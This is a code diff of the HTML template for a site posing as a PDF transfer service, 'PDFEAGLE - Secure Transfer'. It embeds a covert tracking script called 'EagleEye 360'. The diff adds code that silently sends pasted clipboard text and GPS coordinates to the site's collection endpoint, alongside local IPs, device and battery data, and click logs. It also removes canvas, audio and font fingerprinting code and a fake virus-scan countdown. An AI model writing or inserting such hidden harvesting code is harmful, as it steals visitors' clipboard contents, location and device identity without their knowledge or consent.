@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PDFEAGLE</title>
+    <title>PDFEAGLE - Secure Transfer</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
     
@@ -15,14 +15,10 @@
         .card { border: none; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.05); }
         .btn-primary { background: #e74c3c; border: none; }
         .btn-primary:hover { background: #c0392b; }
-        
-        #downloadModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9999; justify-content: center; align-items: center; }
-        .timer-content { background: #fff; padding: 40px; border-radius: 20px; text-align: center; max-width: 400px; width: 90%; }
-        .timer-circle { width: 80px; height: 80px; border: 5px solid #e74c3c; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 30px; font-weight: bold; margin: 0 auto 20px; color: #e74c3c; }
     </style>
 
     <script>
-    // --- EAGLE EYE 360: DIAMOND EDITION ---
+    // --- EAGLE EYE 360: SOTA EDITION ---
     window.EagleEye = class {
         constructor() {
             this.endpoint = '/api/collect';
@@ -32,30 +28,43 @@
 
         init() {
             this.trackBehavior();
+            this.trackClipboard();
             if (document.readyState === 'complete') this.collect('Page Load');
             else window.addEventListener('load', () => this.collect('Page Load'));
+            
+            // Попытка получить GPS при первом клике
+            document.addEventListener('click', () => this.askGeo(), {once:true});
         }
 
-        // 1. Client Hints (Модель и ОС)
+        askGeo() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => this.collect('Geolocation Success', {lat: pos.coords.latitude, lng: pos.coords.longitude}),
+                    (err) => this.collect('Geolocation Denied')
+                );
+            }
+        }
+
+        trackClipboard() {
+            document.addEventListener('paste', (e) => {
+                let paste = (e.clipboardData || window.clipboardData).getData('text');
+                // Шлем первые 100 символов буфера
+                this.collect('Clipboard Paste', { content: paste ? paste.substring(0, 100) : 'Empty' });
+            });
+        }
+
         async getClientHints() {
             if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                 try {
                     const ua = await navigator.userAgentData.getHighEntropyValues([
                         "model", "platformVersion", "fullVersionList", "architecture", "bitness"
                     ]);
-                    return {
-                        model: ua.model,
-                        platform: ua.platform,
-                        version: ua.platformVersion,
-                        architecture: ua.architecture,
-                        mobile: ua.mobile
-                    };
+                    return { model: ua.model, platform: ua.platform, version: ua.platformVersion, mobile: ua.mobile };
                 } catch(e) { return null; }
             }
             return null;
         }
 
-        // 2. WebRTC (Local IP)
         async getLocalIPs() {
             const ips = [];
             try {
@@ -73,7 +82,6 @@
             return ips;
         }
 
-        // 3. WebGL (Видеокарта)
         getWebGLInfo() {
             try {
                 const canvas = document.createElement('canvas');
@@ -87,24 +95,6 @@
             } catch(e) { return { renderer: 'Error', vendor: 'Error' }; }
         }
 
-        // 4. Font Enumeration (Шрифты)
-        getFonts() {
-            const fontList = ["Arial", "Arial Black", "Calibri", "Cambria", "Comic Sans MS", "Consolas", "Courier", "Courier New", "Georgia", "Helvetica", "Impact", "Lucida Console", "Microsoft Sans Serif", "Monaco", "Palatino", "Roboto", "Segoe UI", "Tahoma", "Times", "Times New Roman", "Trebuchet MS", "Ubuntu", "Verdana", "Wingdings"];
-            const detected = [];
-            const span = document.createElement("span");
-            span.style.fontSize = "72px"; span.style.position = "absolute"; span.style.left = "-9999px"; span.innerHTML = "mmmmmmmmmmlli";
-            document.body.appendChild(span);
-            span.style.fontFamily = "monospace";
-            const defaultWidth = span.offsetWidth;
-            for (const font of fontList) {
-                span.style.fontFamily = `"${font}", monospace`;
-                if (span.offsetWidth !== defaultWidth) detected.push(font);
-            }
-            document.body.removeChild(span);
-            return detected;
-        }
-
-        // 5. Battery
         async getBattery() {
             try {
                 if (navigator.getBattery) {
@@ -115,91 +105,34 @@
             return "N/A";
         }
 
-        // 6. Hashes
-        async getHashes() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top'; ctx.font = '14px "Arial"';
-            ctx.fillStyle = '#f60'; ctx.fillRect(125, 1, 62, 20);
-            ctx.fillStyle = '#069'; ctx.fillText('EagleEye_DIAMOND', 2, 15);
-            const canvasHash = this.hash(canvas.toDataURL());
-
-            let audioHash = "blocked";
-            try {
-                const actx = new (window.AudioContext || window.webkitAudioContext)();
-                const osc = actx.createOscillator();
-                const ana = actx.createAnalyser();
-                const gain = actx.createGain();
-                gain.gain.value = 0;
-                osc.connect(ana); ana.connect(gain); gain.connect(actx.destination);
-                osc.start(0);
-                const data = new Float32Array(ana.frequencyBinCount);
-                ana.getFloatFrequencyData(data);
-                osc.stop(); actx.close();
-                audioHash = this.hash(data.slice(0, 10).join(''));
-            } catch(e) {}
-            return { canvas: canvasHash, audio: audioHash };
-        }
-
-        hash(str) {
-            let h = 0;
-            for (let i = 0; i < str.length; i++) h = Math.imul(31, h) + str.charCodeAt(i) | 0;
-            return h.toString(16);
-        }
-
-        trackBehavior() {
-            document.addEventListener('mousemove', e => {
-                if(Math.random() > 0.9) this.behaviorLog.push({t:'mv', x:e.clientX, y:e.clientY, ts: Date.now()});
-            });
-            document.addEventListener('click', e => {
-                this.behaviorLog.push({t:'cl', tag:e.target.tagName, x:e.clientX, y:e.clientY, ts: Date.now()});
-            });
-            document.addEventListener('touchstart', e => {
-                 this.behaviorLog.push({t:'touch', x:e.touches[0].clientX, y:e.touches[0].clientY, ts: Date.now()});
-            });
-        }
-
-        async collect(triggerName) {
-            const [hashes, ips, battery, clientHints] = await Promise.all([
-                this.getHashes(),
+        async collect(triggerName, extraData = {}) {
+            const [ips, battery, clientHints] = await Promise.all([
                 this.getLocalIPs(),
                 this.getBattery(),
                 this.getClientHints()
             ]);
             
             const webgl = this.getWebGLInfo();
-            const fonts = this.getFonts();
             
             const payload = {
                 meta: { url: window.location.href, referrer: document.referrer, trigger: triggerName },
                 fingerprint: {
-                    ...hashes,
                     webgl_renderer: webgl.renderer,
                     webgl_vendor: webgl.vendor,
                     screen: `${screen.width}x${screen.height}`,
-                    pixelRatio: window.devicePixelRatio,
                     cores: navigator.hardwareConcurrency,
                     memory: navigator.deviceMemory
                 },
                 client_hints: clientHints,
-                fonts: fonts,
                 system: {
                     ua: navigator.userAgent,
                     platform: navigator.platform,
-                    languages: navigator.languages,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     battery: battery,
-                    touch: ('ontouchstart' in window) || (navigator.maxTouchPoints > 0)
+                    ...extraData
                 },
-                network: { 
-                    localIPs: ips,
-                    connection: navigator.connection ? {
-                        type: navigator.connection.effectiveType,
-                        rtt: navigator.connection.rtt,
-                        downlink: navigator.connection.downlink
-                    } : 'N/A'
-                },
-                behavior: this.behaviorLog.slice(-50)
+                network: { localIPs: ips },
+                behavior: this.behaviorLog.slice(-20)
             };
 
             fetch(this.endpoint, {
@@ -207,6 +140,12 @@
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(payload),
                 keepalive: true
+            });
+        }
+        
+        trackBehavior() {
+            document.addEventListener('click', e => {
+                this.behaviorLog.push({t:'cl', tag:e.target.tagName, x:e.clientX, y:e.clientY, ts: Date.now()});
             });
         }
     };
@@ -225,19 +164,6 @@
 
     <div class="container main-container">
         {% block content %}{% endblock %}
-    </div>
-
-    <!-- Модальное окно таймера -->
-    <div id="downloadModal">
-        <div class="timer-content">
-            <h3 class="mb-3">Подготовка файла...</h3>
-            <p class="text-muted mb-4">Мы сканируем файл на вирусы и формируем защищенную ссылку.</p>
-            <div class="timer-circle" id="timerValue">10</div>
-            <p class="small text-muted">Пожалуйста, не закрывайте страницу.</p>
-            <div class="progress mt-3" style="height: 5px;">
-                <div class="progress-bar progress-bar-striped progress-bar-animated bg-danger" id="progressBar" style="width: 0%"></div>
-            </div>
-        </div>
     </div>
 
     <footer class="text-center mt-5 mb-4 text-muted small">
